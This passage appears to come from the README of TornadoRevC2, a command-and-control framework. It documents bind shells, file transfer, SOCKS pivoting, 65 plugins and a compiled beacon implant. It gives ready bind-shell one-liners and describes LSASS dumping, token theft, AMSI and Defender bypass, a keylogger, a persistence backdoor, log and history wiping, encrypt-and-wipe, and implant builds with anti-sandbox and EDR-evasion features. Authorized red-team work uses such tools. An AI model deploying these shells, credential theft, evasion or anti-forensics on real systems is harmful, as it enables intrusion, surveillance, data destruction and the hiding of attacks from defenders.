**Session-log evidence.** Every command is tagged with the transport that actually carried it. `logs/<session>/session.log` shows `cmd[shell] …` and `cmd[http2] …` lines correlated with the operator's input, so the switch can be verified without trusting the handler's own bookkeeping.

**Auto-revert.** If the HTTP/2 stream closes for any reason, the handler calls `cleanup_client` on the bridge, reverts `active_transport` to `shell`, and prints `Secondary transport on #N closed — reverted to shell`. If the primary shell dies while HTTP/2 is still up, the handler promotes HTTP/2 automatically and prints `Primary shell closed on #N — HTTP/2 transport still active`.

### Bind shells

Bind sessions dial outward to a target that is already listening. Once connected, the session behaves identically to a reverse shell — same probes, same plugins, same transfers, same logging. Only the direction flag differs.

| Command | Description |
|---------|-------------|
| `bind <host> <port>` | Dial a plaintext bind shell |
| `bind <host> <port> --tls` | Dial a TLS-wrapped bind shell (target must speak TLS — `ncat --ssl`, `socat OPENSSL-LISTEN`, or a custom TLS bind stub) |
| `bind <host> <port> --tls --verify` | Same, but validate the target certificate against the system trust store |

**Example target-side listeners:**

```bash
# Linux — plaintext bind shell with a PTY
ncat -lvnp 4444 --exec "/bin/bash --noprofile --norc -i"

# Linux — TLS-wrapped bind shell (self-signed cert)
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 1 -nodes -subj "/CN=x"
cat cert.pem key.pem > server.pem
socat OPENSSL-LISTEN:4444,reuseaddr,fork,cert=server.pem,verify=0 EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane

# Windows — plaintext via ncat
ncat.exe -lvnp 4444 -e cmd.exe
```

### Plugins

| Command | Description |
|---------|-------------|
| `plugins` / `plugins list` | List registered plugins |
| `plugins list --verbose` | Show module paths and load state |
| `plugins load <name>` | Load a plugin at runtime (builtin or external) |
| `plugins unload <name>` | Disable or unload a plugin |
| `plugins reload <name>` | Reload a plugin module |
| `plugins rescan` | Re-scan `shared/`, `linux/`, `windows/`, and external plugin directories. Loads any new modules found and enables their commands. No handler restart required. |
| `plugins info <name>` | Display plugin metadata |
| `run <plugin> <ID> [args...]` | Execute a plugin against a session |

### File transfer

All transfer commands accept a `--resume` flag (`-r`) to continue an interrupted upload or download from where it stopped. Resume is verified against the destination: the tail of the partially written file is compared byte-for-byte with the source, and the transfer restarts cleanly if the check fails.

| Command | Description |
|---------|-------------|
| `upload [--resume] <ID> <local> <remote>` | Upload with chunked transfer |
| `upload --https [iface] [-RH host[:port]] [--resume] <ID> <local> <remote>` | Upload over HTTPS |
| `download [--resume] <ID> <remote> <local>` | Download with chunked transfer |
| `download --https-push [iface] [-RH host[:port]] <ID> <remote> <local>` | Download over HTTPS — the handler runs a one-shot HTTPS upload endpoint and the target PUTs the file to it |
| `verify <ID> <remote>` / `hash <ID> <remote>` | Verify remote file size and SHA-256 |

**HTTPS flags:**

| Flag | Description |
|------|-------------|
| `--https` | **Upload only.** Use HTTPS transport instead of the default chunked/line-based path |
| `--https-push` | **Download only.** Handler starts an HTTPS upload server; the target pushes the file to it |
| `--https <iface>` / `--https-push <iface>` | Bind the operator-side HTTPS server to the named interface (e.g. `eth0`, `tun0`) or IP address. Default: `0.0.0.0` |
| `-RH <host>[:<port>]` | Host and/or port the target should connect back to. Useful when the target reaches the handler through a NAT or redirector. Default: auto-detected from the bind interface or the reverse shell's local endpoint |

Both HTTPS transports use the handler's existing `tls_certs/server.pem` and `tls_certs/server.key` — no additional certificates are generated. Targets skip certificate verification (self-signed cert). On Windows, the target tries `curl.exe -T` first, then `WebClient.UploadFile(... 'PUT' ...)` for push, or `Invoke-WebRequest` with `-SkipCertificateCheck` on PowerShell 6+ and a `ServerCertificateValidationCallback` shim on 5.1 for pull. On Linux and Unix, the target command chain tries `curl -k`, then `wget --no-check-certificate`, then `python3` or `python` with an unverified SSL context.

**Resume is not supported** for either HTTPS transport (`--https` upload or `--https-push` download). Passing `--resume` prints a warning and performs a full transfer. Use the default chunked paths (`upload --resume` / `download --resume`) when resume is required.

**Remote path resolution:** if the remote path refers to a directory (either ends with a separator, or exists as a directory on the target), the local file's basename is appended automatically. So `upload 1 ./report.md /tmp/` writes to `/tmp/report.md`, and `upload 1 ./report.md C:\Users\Alice` writes to `C:\Users\Alice\report.md`.

**Example:**

```bash
# Default transport (line-based on Windows, chunked on Linux)
upload 1 ./tool.exe "C:\Temp\tool.exe"

# HTTPS upload, bind to eth0, advertise a public IP:port to the target
upload --https eth0 -RH 203.0.113.5:8443 1 ./tool.exe "C:\Temp\tool.exe"

# HTTPS upload with resume (warning printed; full upload performed)
upload --https --resume 1 ./big.iso "C:\Temp\big.iso"

# Default chunked download with resume
download --resume 1 /var/log/auth.log ./auth.log

# HTTPS push download — handler hosts the endpoint, target PUTs the file
download --https-push 1 /home/kamal/Documents/archive.zip ./archive.zip

# HTTPS push download bound to a specific interface, with a reachable callback
download --https-push eth0 -RH 203.0.113.5:9444 1 /var/log/auth.log ./auth.log

# Passing a directory as <local> appends the remote file's basename
# → writes ./logs/auth.log (dir created if missing)
download --https-push 1 /var/log/auth.log ./logs
```

### In-memory execution

| Command | Description |
|---------|-------------|
| `run inmemory <ID> <type> <local_file> [-- args] [--save-output <file>]` | Execute payload in memory |

Supported types: `py`, `ps`, `exe`, `elf`, `bat`, `sh`

### Network pivoting

| Command | In-session form | Description |
|---------|-----------------|-------------|
| `socks <ID> <listen_port>` | `socks <listen_port>` | Start a SOCKS5 proxy through a session (local listener on `127.0.0.1:<listen_port>`). Deploys the tunnel agent on first use. |
| `socks <ID> test <host> <port>` | `socks test <host> <port>` | Test TCP reachability to an internal host through an existing proxy. Requires a proxy already running for the session; will not deploy the agent. |
| `socks <ID> reset` | `socks reset` | **Soft reset** — abort local relays, purge remote streams, clear buffers, and rebalance channels. Active SOCKS listeners remain bound. |
| `socks <ID> reset --hard` | `socks reset --hard` | **Hard reset** — kill and redeploy the remote tunnel agent for a fully fresh state. |
| `socks <ID> stop [<proxy_id>]` | `socks stop <proxy_id>` | Stop a SOCKS proxy for the session. With no `<proxy_id>`, stops every proxy owned by that session. When the last proxy on a session stops, the remote agent is terminated and any on-disk artifact (Unix only) is removed. |
| `socks stop <proxy_id>` | — | Stop a proxy by ID from the main menu, regardless of session. |
| `tunnels` | `tunnels` | List active SOCKS proxies, session ID, channel count, and status. |

### General

| Command | Description |
|---------|-------------|
| `bind <host> <port> [--tls] [--verify]` | Dial a target listening for a bind shell |
| `payloads` | Display the built-in payload reference |
| `update` | Check for updates from the official GitHub repository and restart after a successful fast-forward pull (requires Git; main menu only) |
| `help` | Show the command reference |
| `exit` / `quit` | Shut down the handler |

---

## Built-in Plugins

TornadoRevC2 ships with **65 built-in plugins** organized by function. All enumeration-related plugins are read-only unless noted otherwise.

### Host assessment & environment

| Plugin | Platform | Description |
|--------|----------|-------------|
| `quickenum` | Cross-platform | Fast structured host triage: identity, network, environment, prioritized findings |
| `virtualization` | Cross-platform | Virtualization, container, orchestration, and cloud environment detection |
| `kernel` | Cross-platform | Kernel version, loaded modules/drivers, security mitigations, and kernel configuration |
| `integrity` | Cross-platform | Secure Boot, BitLocker/LUKS, code-signing enforcement, kernel lockdown, and integrity protections |
| `filesearch` | Cross-platform | Search files by path, name, ext, size, owner, mtime (`run filesearch help` for options) |
| `packages` | Cross-platform | Installed software, package managers, repository configuration, and recent installs |
| `kerberosenum` | Cross-platform | Kerberos ticket metadata: caches, default principal, realm, TGT, service tickets, encryption types, flags (renewable/forwardable), keytab files, krb5.conf/registry config, and environment variables (no secrets) |
| `preflight` | Cross-platform | Detection environment assessment: EDR/AV process scan (~45 known agents), PowerShell logging state (ScriptBlock, Module, Transcription), AMSI presence, Sysmon, LSA protection, Credential Guard (see `lsa` plugin for full LSA/DPAPI/LSA-secrets posture), Credential Guard, Defender realtime, Linux auditd rules, eBPF activity, SELinux/AppArmor, SSH session recording, PROMPT_COMMAND hooks. Renders a risk-assessment block before raw data. |

> `sysinfo` is a handler command, not a plugin — see [Session management](#session-management).

### Network & connectivity

| Plugin | Platform | Description |
|--------|----------|-------------|
| `firewall` | Cross-platform | Firewall status, profiles/zones, policies, and notable rules (WDF, UFW, firewalld, nftables, iptables) |
| `ports` | Cross-platform | Listening ports, established connections, owning processes, and routing |
| `netscan` | Cross-platform | Fast TCP connect scan of hosts and CIDRs. `--ip` accepts a single IP, a comma/space-separated list, or a CIDR (`10.0.0.0/24`). `--port` accepts nmap-style specs: `top10` / `top100` / `top1000` presets, ranges (`1-500`), lists (`22,80,443`), or mixed (`22,80,1000-2000`). Linux collector uses an asyncio non-blocking socket pool auto-tuned to `RLIMIT_NOFILE`; Windows collector uses a runspace pool plus batched parallel `BeginConnect` per host. Target expansion capped at 4096 hosts |
| `proxy` | Cross-platform | System, environment, PAC/WPAD, and browser proxy settings |
| `vpn` | Cross-platform | VPN clients, active connections, adapters, and configuration metadata |

### Credentials, browsers & applications

| Plugin | Platform | Description |
|--------|----------|-------------|
| `credstore` | Cross-platform | Credential store metadata (no secret extraction): Credential Manager, keyrings, browser stores |
| `lsassdump` | Windows | LSASS minidump via `MiniDumpWriteDump` (full-memory flags). Three techniques, tried in order: direct `OpenProcess`, handle duplication (`--duplicate`), and `NtCreateSection` + `NtCreateProcessEx` fork (`--fork`) for PPL-protected LSASS. `--elevate` toggles the `SeDebugPrivilege` acquisition step. The dump is staged at `%TEMP%\\lsass.dmp` on the target and **downloaded to the operator automatically** using a single-PowerShell-process streaming transfer with in-line SHA-256 hashing — no separate `download` step required. `--out <path>` sets the **operator-side** destination (default `./lsass.dmp`). |
| `browser` | Cross-platform | Installed browsers, profiles, extensions, bookmarks, and enterprise policies |
| `clipboard` | Cross-platform | Remote clipboard text capture |
| `secrets` | Linux/Unix | Configuration files, environment variables, SSH keys, and cloud credentials |

### Host internals

| Plugin | Platform | Description |
|--------|----------|-------------|
| `history` | Cross-platform | Shell history, package/update logs, and recent login activity |
| `mounts` | Cross-platform | Mount points, SMB/NFS shares, mapped drives, container filesystems |
| `memorymap` | Cross-platform | Process memory maps and loaded modules for a specified PID |
| `screenshot` | Cross-platform | Desktop capture returned to the operator (GUI sessions; PNG saved locally) |
| `cron` | Linux/Unix | Cron jobs, system crontabs, user crontabs, and at queues |
| `systemd` | Linux/Unix | Services, timers, failed units, and enabled startup units |
| `privbins` | Linux/Unix | SUID/SGID binaries, file capabilities, and privilege-escalation-relevant executables |
| `lsm` | Linux/Unix | SELinux, AppArmor, and other Linux Security Modules: enforcement mode, policies, and configuration |
| `journal` | Linux/Unix | Structured journalctl summaries: authentication, kernel, service failures, and recent events |
| `sshaudit` | Linux/Unix | SSH server enumeration: effective sshd config, auth surface, pivoting options, host keys, authorized_keys, and CA trust |
| `containers` | Linux/Unix | Container runtimes and workloads: Docker, Podman, containerd, CRI-O, LXC/LXD, and Kubernetes indicators |
| `sudoers` | Linux/Unix | Sudo configuration audit and NOPASSWD exploitation. `-eu` reports sudo binary mode and setuid bit, parsed version with CVE matching (CVE-2021-3156, CVE-2021-23239, CVE-2019-14287, CVE-2019-18634, CVE-2023-22809), `sudo -n -l` rights, NOPASSWD entries, readable `/etc/sudoers` and `sudoers.d`, aliases (User/Runas/Host/Cmnd), Defaults directives, include directives, `/etc/sudo.conf`, and the sudo timestamp directory. `-exp` appends `<user> ALL=(ALL) NOPASSWD: ALL` when `/etc/sudoers` is writable, with baseline visudo comparison and authoritative `sudo -n -l` verification |
| `rshell` | Linux/Unix | Restricted-shell detection and escape automation. `-chk` reports shell kind, parent process, and six restriction probes (cd, PATH, redirection, absolute exec, slash-in-command). `-list` shows the escape method catalog with a single-round-trip binary probe. `-run <id>` executes one method. `-auto` tries runnable methods in order of reliability and reports what succeeded, what was skipped, and what remains manual. Editor methods run in Ex mode and spawn a TLS reverse shell via `-rh` / `-rp` without hijacking the operator's PTY |
| `writable` | Linux/Unix | Writable filesystem audit: PATH directories and writable binaries, cron locations, systemd units, init scripts, profile scripts, ld.so config, `/etc/passwd` / `/etc/shadow`, logrotate, mail spools, and Docker socket. Produces a `findings` array with `kind` + `path` per entry |
| `usersessions` | Cross-platform | Active local, remote, SSH, RDP, console, and service sessions with login/source metadata |

### Windows domain & system

| Plugin | Platform | Description |
|--------|----------|-------------|
| `adinfo` | Windows | Domain membership, domain controllers, forests, trusts, and OUs |
| `services` | Windows | Windows services, startup types, binaries, and service accounts |
| `scheduledtasks` | Windows | Scheduled tasks, triggers, execution context, and actions |
| `registry` | Windows | Autorun keys, startup locations, and installed software |
| `eventlogs` | Windows | Security, System, Application, and PowerShell log summaries |
| `defender` | Windows | Windows Defender status, exclusions, preferences, ASR rules, threats, AV products, services, and Exploit Protection config. `-d/--disable` attempts a full disable (admin required). |
| `certificates` | Windows | Certificate stores, code-signing, and enterprise certificates |
| `rdp` | Windows | Remote Desktop configuration, active sessions, recent targets, restricted-admin, start, adduser, and shadow (reverse shell as session user) |
| `gpo` | Windows | Applied GPOs, local/domain security policies, AppLocker, WDAC, SRP, and GPO scripts |
| `winrm` | Windows | WinRM configuration, listeners, authentication methods, client settings, certificate bind/exploitcert, start, adduser, and remoting status |
| `drivers` | Windows | Installed drivers and kernel modules, signed/unsigned status, startup type, and notable security/VM drivers |
| `powershell` | Windows | PowerShell version, execution policy, logging, modules, remoting settings, and profile paths |
| `lsa` | Windows | Credential-security posture and hardening gaps: LSA PPL, Credential Guard, VBS/HVCI, WDAC, NTLM, Kerberos, Winlogon, WDigest, token privileges, Registry audit policy, LAPS, DPAPI. Severity-ranked `findings` block; unreadable fields render as `N/A`. `--deep` adds DPAPI store + LSA secret name enumeration. `--extract` (implies `--deep`, needs SYSTEM) attempts in-memory DPAPI/LSA-secret decryption. No artifacts written. |
| `steal_token` | Windows | Token theft and impersonation: list processes and owners, impersonate another process's token (`--pid` / `--user`), spawn a process as the token owner (`--spawn` / `--spawn-cmd`), or spawn a reverse shell as the token owner (`--spawn-shell`). Not a collector — a C# helper (`_token_ops.cs`) loaded in-process via `Add-Type`. |
| `wmi_activity` | Windows | WMI persistence enumeration: `__EventFilter`, `CommandLineEventConsumer`, `ActiveScriptEventConsumer`, `LogFileEventConsumer`, `NTEventLogEventConsumer`, `SMTPEventConsumer`, and `__FilterToConsumerBinding`. Flags suspicious payloads (base64, encoded commands, download strings, `mshta`, `rundll32`, known tool names). Checks WMI repository integrity and lists custom namespaces |
| `trusts` | Windows | Domain trust relationships: `Get-ADTrust` with `nltest /domain_trusts` fallback. Reports direction, type, transitivity, SID filtering, forest-transitive, and selective authentication. Cross-references local Administrators for foreign principals, captures current user's SID history from group memberships, and produces an analysis block with actionable notes |
| `dlls` | Windows | Loaded module audit for a specified PID (up to 200 modules). Flags unsigned, missing-on-disk (hollowing indicator), UNC-path, suspicious-directory (`%TEMP%`, `Downloads`, `Public`) module loads, and company/signer mismatches. Suspicious entries sorted to the top |

### Execution & operational

| Plugin | Platform | Description |
|--------|----------|-------------|
| `inmemory` | Cross-platform | In-memory payload execution (`py`, `ps`, `exe`, `elf`, `bat`, `sh`) |
| `bofloader` | Windows | In-memory BOF (COFF) execution via a C# loader compiled once per session. Operator subcommands: `import <cna>` / `import <file.o>` / `import <dir>`, `delete`, `list`, `compile` (C and C++, x64 and x86 via mingw, `--arch x64|x86|both`), `info`, `execute`. Registers CNA aliases and compiled `.o` files as `bof <name>` commands (persisted to `.vscode` / `logs/.tornadorevc2_bofs.json`). Source-driven pre-flight probes only the `#include` lines present in the source and reports missing headers with per-distro install commands. AMSI bypass is delegated to the `amsi_bypass` plugin and skipped when the session already carries a matching mode. OPSEC: no RWX, COFF zeroed, VEH, randomized markers, gzip+deflate payloads |
| `make_token` | Cross-platform | Establish C2 sessions *to other hosts* over SSH, WinRM, SMB, WMI, MSSQL, DCOM, or MySQL/MariaDB using passwords, NTLM hashes, SSH keys, WinRM client certs, netexec, and MySQL UDF auto-loading. Supports custom commands (`-C`). |
| `nullcrypt` | Cross-platform | Hybrid encrypt a file (AES-GCM + RSA-wrapped key) then securely wipe the original via wiper |
| `wiper` | Cross-platform | Configurable multi-pass secure overwrite (rename, truncate, delete); profiles: quick, standard, dod, thorough, shred |
| `historydel` | Cross-platform | Clear current user shell history files and related storage |
| `eventlogdel` | Windows | Clear Windows Event Logs: defaults (Security, System, Application, PowerShell), a custom log list, or every log with records; optional .evtx backup |
| `runas` | Windows | Execute commands or launch a TLS-encrypted reverse shell *on the current host* as another user, with saved credential management and domain support |
| `enablepriv` | Windows | Enable or disable any privilege on the current process token via `AdjustTokenPrivileges`. The C# helper is compiled in memory with `Add-Type`; no file is written to disk. Modes: `--list` (privileges present in the token), `--list-all` (standard `SeXxxPrivilege` catalogue merged with token state), `--vuln` (held privileges grouped by security significance), a single privilege by name, and `--all` / `--all --disable` for the whole token in one round trip. Names normalise in C# (`debug` → `SeDebugPrivilege`). Changes are token-scoped and revert when the shell exits. |
| `amsi_bypass` | Windows | Apply, inspect, or clear the AMSI bypass on a live session. Modes: `context` (default — nulls `amsiContext` and sets `amsiInitFailed`; works on PS 5.1 and PS 7), `hwbp` (hardware breakpoint on `AmsiScanBuffer` + VEH — no code bytes modified, defeats code-integrity scanners), and `none`. Subcommands: `apply`, `status`, `list`, `clear`. Per-session state is shared with `bofloader`, which delegates to this plugin and skips re-applying a matching mode. |
| `ligolong` | Cross-platform | Deploy Ligolo-NG tunneling agent to Linux/Windows targets with background persistence |
| `chisel` | Cross-platform | Deploy Chisel tunneling agent in reverse (client) or bind (server) mode; supports SOCKS5 and background persistence |
| `persistence` | Cross-platform | Install a persistent reverse shell backdoor (cron @reboot / Run registry) using TLS-encrypted payload |
| `upgrade_mtls` | Cross-platform | Push the handler's mTLS client bundle to a session and relaunch it over the mTLS listener (opt-in; does not affect other listeners) |
| `keylogger` | Cross-platform | Keystroke capture with window context: `start` / `status` / `stop` / `fetch`. Windows uses PowerShell `GetAsyncKeyState` in a hidden process. Linux/Unix uses X11 XRECORD via ctypes (no external Python deps) with a `/dev/input` fallback for root or `input`-group users. Log rotates with the token; scripts and logs removed on `stop` unless `--keep-log` |

> **`make_token` vs `runas`:** `make_token` establishes sessions *to other hosts* over remote protocols. `runas` executes *on the current host* as a different user (requires credentials).

> **`steal_token` vs `runas`:** `runas` requires credentials. `steal_token` reuses an existing logon token from another process on the same host — no credential input required, but admin/SYSTEM access is typically needed to reach the interesting tokens. `--pid` / `--user` impersonate the current thread (persistent only in interactive PowerShell sessions); `--spawn` / `--spawn-cmd` / `--spawn-shell` create an independent process that runs as the token owner and are the recommended, reliable modes.

> **SOCKS reset modes:** `socks reset` performs a soft reset (relays aborted, remote streams purged, buffers cleared). `socks reset --hard` additionally kills the remote tunnel agent and redeploys it for a clean slate. `socks test` requires an already-running proxy for the session and will not deploy the agent on its own — start a proxy first with `socks <ID> <listen_port>`. Stopping the last proxy for a session with `socks stop` automatically terminates the agent (Windows: kill the `TNB_<token>` PowerShell child; Unix: `pkill` + `rm /tmp/.tornado_agent_*.py`).

> **`preflight` is a pre-action check.** Run it before `steal_token`, `runas`, or any `inmemory` command. Its risk-assessment block tells the operator what will log the action before the action happens. If ScriptBlock logging is enabled, prefer `--spawn-shell` over PS-based flows; if AMSI is loaded and signed tooling is a concern, consider a different vector.

> **`keylogger` is signatured by design.** The Windows side uses `GetAsyncKeyState`, a heavily monitored API. Use it on targets where the engagement accepts that cost, and prefer `--spawn-shell` from a stolen token so the process runs under a different identity. The plugin logs every action to the session log for engagement reporting.

> **`rshell` callback methods require `-rh` and `-rp`.** Methods that spawn a new session (`vi_esc`, `vim_esc`) take `-rh <ip>` and `-rp <tls_port>` and open a TLS reverse shell back to the handler's TLS listener. Non-callback methods (interpreters, utilities, env) ignore those flags. `run rshell -auto` without them skips the callback methods and reports them as skipped.

**In-memory execution methods:**

| Type | Method |
|------|--------|
| `py` | Python via `exec(compile(...))` |
| `ps` | PowerShell via `[ScriptBlock]::Create(...)` (no IEX) |
| `exe` | Windows PE via in-memory RunPE (process hollowing), subsystem-aware host selection, full `CONTEXT64` context, background pipe draining |
| `elf` | Linux ELF via `memfd_create` — modern (`os.memfd_create`, Python 3.8+), legacy (direct syscall via ctypes for older Python or unsupported architectures), or `/dev/shm` fallback |
| `sh` | Shell script streamed via `bash -s` |
| `bat` | Batch script streamed via `cmd.exe /Q` stdin |

PEASS-ng scripts for in-memory privesccheck: [github.com/carlospolop/PEASS-ng](https://github.com/carlospolop/PEASS-ng)

---

## Beacon Subsystem

TornadoRevC2 includes a **pull-based beacon subsystem** alongside the
interactive shell handler. Both run in the same process, share the
operator console, and share infrastructure (TLS certificates, malleable
profiles, session logging). They share no session state and no code
paths — the shell handler continues to operate exactly as before when
the beacon subsystem is not enabled.

### What a beacon is (and is not)

A beacon is a **compiled implant** that wakes on its own schedule,
checks in with the server, retrieves queued work, executes it, and
returns to sleep. The operator queues commands; the beacon picks them
up on its next check-in.

| | Shell handler | Beacon subsystem |
|---|---|---|
| **Connection** | Persistent bidirectional socket | Stateless HTTP check-ins |
| **Execution** | Synchronous, operator-typed | Queued, executed at next check-in |
| **Latency** | Immediate | Bounded by sleep interval |
| **Implant** | Shell (`bash`, `cmd.exe`, PowerShell) | Compiled Go binary |
| **OPSEC profile** | Command obfuscation, in-process routing | Compile-time evasion flags |
| **Authentication** | Session-scoped markers | ECDSA-signed tasks and results |

The beacon is **not** a replacement for the shell handler. Interactive
engagements, low-latency operations, and plugin-heavy workflows belong
on the shell side. The beacon is for long-haul engagements where a
compiled agent that survives reboots, retries on network failure, and
self-destructs on a schedule is the right tool.

### Key features

| Category | Capabilities |
|----------|-------------|
| **Implant** | Go binary, cross-compiled from the operator machine · No runtime config file, no environment variables, no command-line arguments — every property is baked in at build time |
| **Transport** | HTTPS with server-authenticated TLS by default · Optional mutual TLS using the handler's existing mTLS bundle · Optional RootCA pinning |
| **Wire protocol** | Three endpoints: `POST /beacon`, `GET /tasks`, `POST /results` · JSON bodies with base64 for binary fields |
| **Native execution** | `cat`, `ls`, `ps`, `id`, `env`, `pwd`, `whoami`, `hostname`, `uname` execute in-process — no `fork`, no `execve`, no Sysmon EventID 1 |
| **Command execution** | `exec` spawns a child process. Used only when no native verb covers the operation |
| **Scheduling** | Configurable sleep interval and jitter, negotiated on check-in · Re-check-in on session expiry · Kill date enforcement |
| **Cryptography** | ECDSA P-256 task signing (server → agent) · ECDSA result signing (agent → server) · Trust-on-first-use public key pinning per session |
| **OPSEC** | Compile-time evasion profiles · Anti-sandbox, anti-debug, anti-VM heuristics · AMSI/ETW patching · Sleep mask · String obfuscation · Garble · UPX |
| **Malleable C2** | Named profiles under `profiles/c2/` control URI paths, User-Agent, and HTTP headers · Listener auto-discovers every profile's paths at startup |
| **Chunked transfer** | Upload: `truncate` / `writechunk` / `sha256file` · Download: `filesize` / `readchunk` / `sha256file` · Chunk sizes jittered within `[base/2, base]` in both directions so the wire pattern does not correlate to a fixed TornadoRevC2 chunk size · Batched enqueue to respect the task queue cap · Local and remote SHA-256 verified before the transfer is declared complete · Every chunk served by the agent's in-process `os.Open` / `Seek` / `Read` / `Write` path — no `subprocess`, no `argv`, no process-creation telemetry |
| **In-memory payloads** | `execmem <path> exe` on Windows (process hollowing via an embedded C# loader, same source as the shell handler's `inmemory` plugin) · `execmem <path> elf` on Linux (`memfd_create`, `/dev/shm` fallback) · On-disk file unlinked before invocation on both paths |
| **Inline scripts** | `pyexec`, `psexec`, `shexec` deliver script source base64-encoded in the task and pipe it to `python3 -`, `powershell.exe -Command -`, or `/bin/sh -s` via stdin · Source never appears in argv |
| **BOF/COFF** | `bof <name>` or `bof <path.o>` on Windows · Registry shared with the shell handler's `bofloader` plugin (`logs/.tornadorevc2_bofs.json`) · Argument packing matches the shell handler byte-for-byte · AMSI/ETW patched inside the loader |
| **Build system** | `beacon-build` operator command — interactive wizard or non-interactive flags · Cross-compilation for Windows and Linux, amd64 and arm64 · Shellcode output via Donut · Per-build selection of OPSEC profile, C2 profile, TLS fingerprint, kill days, working-hours window, mTLS bundle directory · Custom mTLS bundle via `--mtls-dir` or individual `--mtls-cert` / `--mtls-key` / `--mtls-ca` paths · Silent by default; `--verbose` (or `BeaconBuildConfig.verbose`) enables diagnostic stderr on the target |

### Architecture

```text
┌────────────────────────────────────────────────────────────────┐
│                    Operator Console (handler)                  │
│  Shell sessions · Beacon sessions · Plugin execution · Logging │
│                    beacon-build · beacon <ID>                  │
└─────────────────┬─────────────────────────────┬────────────────┘
                  │                             │
         SHELL HANDLER                    BEACON ENGINE
       (interactive, live)              (queue, no live socket)
                  │                             │
                  │                    ┌────────┴────────┐
                  │                    │                 │
                  │             POST /beacon       GET /tasks
                  │             POST /results       (TLS)
                  │                    │                 │
                  ▼                    ▼                 ▼
        ┌──────────────────────────────────────────────────────┐
        │              Target Host (Go agent)                  │
        │  Native verbs · exec · sleep loop · kill date        │
        │  No live socket · No runtime config                  │
        └──────────────────────────────────────────────────────┘
```

The beacon listener runs on a **dedicated port** (`--beacon-port`), separate from the shell listeners. It terminates TLS itself and reuses the handler's existing certificate material. It never shares a port with the shell handler.

### Requirements

The beacon subsystem adds three dependencies on top of the shell handler:

| Dependency | Purpose | Install |
|-----------|---------|---------|
| **Go toolchain 1.24+** | Cross-compiles the agent | System package manager or [go.dev/dl](https://go.dev/dl/) |
| **Flask / Werkzeug** | HTTP listener | `pip install flask` |
| **cryptography** | ECDSA signing | `pip install cryptography` |
| **`github.com/refraction-networking/utls`** | Browser TLS ClientHello (Go module) | Pulled automatically by `go mod tidy` inside `agent/` |

Optional:

| Dependency | Purpose | Install |
|-----------|---------|---------|
| **garble** | Control-flow obfuscation (used by `opsec` and `paranoid` profiles) | `go install mvdan.cc/garble@latest` |
| **UPX** | Binary packing (used by `paranoid` profile) | System package manager |
| **Donut** | Shellcode output format | [TheWover/donut](https://github.com/TheWover/donut/releases) |

The shell handler runs identically without any of these — the beacon subsystem is never imported unless `--beacon-port` is passed.

### Quick Start

#### 1. Start the handler with the beacon listener

```bash
python3 tornadorevc2.py --beacon-port 8881
```

The listener auto-discovers every C2 profile under `profiles/c2/` and
registers its paths alongside the defaults. To narrow to a single
profile, pass `--beacon-profile <name>`:

```bash
python3 tornadorevc2.py --beacon-port 8881 --beacon-profile chrome
```

For mTLS beacons:

```bash
python3 tornadorevc2.py --beacon-port 8881 --beacon-mtls-ca mtls_certs/ca.pem
```

#### 2. Build an agent

Two ways:

**Interactive wizard:**

```
tornado> beacon-build
```

Prompts for target OS, architecture, output format, callback URL,
OPSEC profile, C2 profile, kill days, and whether to embed the mTLS
client bundle.

**Non-interactive:**

```
tornado> beacon-build linux amd64 --profile stealth --c2-profile chrome --kill-days 30
tornado> beacon-build windows amd64 --profile opsec --c2-profile slack --mtls
```

Flags:

| Flag | Values | Default |
|------|--------|---------|
| `--format <fmt>` | `exe`, `dll`, `elf`, `shellcode` | `exe` on Windows, `elf` elsewhere |
| `--url <url>` | HTTPS callback URL | Derived from the running handler |
| `--profile <name>` | `default`, `stealth`, `opsec`, `paranoid` | `default` |
| `--c2-profile <name>` | A profile name under `profiles/c2/` | Handler default |
| `--tls-profile <name>` | `go`, `chrome`, `firefox`, `safari` | `go` |
| `--kill-days <N>` | Days until self-destruct (0 = no deadline) | `30` |
| `--work-hours <spec>` | `HH:MM-HH:MM` or `off` (target local time; a wrapped window like `22:00-06:00` is valid) | `08:00-19:00` |
| `--work-off` | Shorthand for `--work-hours off` | — |
| `--mtls` | *(flag)* — embed the handler's own `mtls_certs/` bundle | off |
| `--mtls-dir <dir>` | Directory containing `client.pem`, `client.key`, `ca.pem` — implies `--mtls` | off |
| `--mtls-cert <path>` / `--mtls-key <path>` / `--mtls-ca <path>` | Override individual PEM paths — implies `--mtls` | off |

Compiled agents land in `beacon_output/beacon_<os>_<arch>[.exe]`.

**The build-time `--work-hours` value is a default, not a lock-in.** The runtime `workhours` command from the beacon console overrides it on the next poll, and the agent acknowledges the new window within one check-in cycle.

**mTLS is a shared secret between the build and the listener.** A beacon built against PKI `A` can only check in against a listener configured for the same PKI `A`. If you build with a custom `--mtls-dir`, start the handler with `--beacon-mtls-dir` pointing at the same directory:

```bash
# Build against the operator's custom PKI
beacon-build linux amd64 --url https://10.0.0.1:8881 --mtls-dir /etc/pki/eng

# Start the handler against the same PKI
python tornadorevc2.py -H 0.0.0.0 --beacon-port 8881 --beacon-mtls-dir /etc/pki/eng
```

#### 3. Deploy and run

Run the agent on the target. On the first check-in the operator console prints:

```
[BEACON] New beacon #1001: alice@WIN-DEV (windows/amd64) | beacon 1001
```

#### 4. Operate

```
tornado> beacons                        # List active beacons
tornado> beacon 1001                    # Attach to a beacon console
● beacon#1001 > ls C:\Users\alice
● beacon#1001 > cat C:\Users\alice\notes.txt
● beacon#1001 > exec whoami /all
● beacon#1001 > sleep 120 0.4           # Change check-in interval
● beacon#1001 > exit                     # Detach (beacon keeps running)
● beacon#1001 > kill                     # Self-destruct (confirmation prompt)
```

### OPSEC Profiles

Every evasion feature is **compile-time only**. There is no configuration
file on the target, no environment variable, no registry key. A captured
binary contains everything it needs to run.

| Profile | Features | Use case |
|---------|----------|----------|
| `default` | None | Lab testing, internal authorized assessments |
| `stealth` | String obfuscation | Standard engagements |
| `opsec` | String obfuscation, garble, AMSI bypass, ETW patch, anti-sandbox, anti-debug, anti-VM, PPID spoof | Monitored environments |
| `paranoid` | Everything in `opsec` plus additional sleep-mask modes | High-risk targets with mature EDR |

**Compile-time configuration means the binary is the configuration.**
Rebuilding is the only way to change the callback URL, the sleep
interval, or which evasion features are present. This is deliberate:
a binary with the URL baked in is harder to pivot against than one that
reads a config file.

### C2 Profiles

C2 profiles decouple the HTTP fingerprint from the build. Each profile
is a JSON file under `profiles/c2/`:

```json
{
  "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ...",
  "linux_user_agent": "Mozilla/5.0 (X11; Linux x86_64) ...",
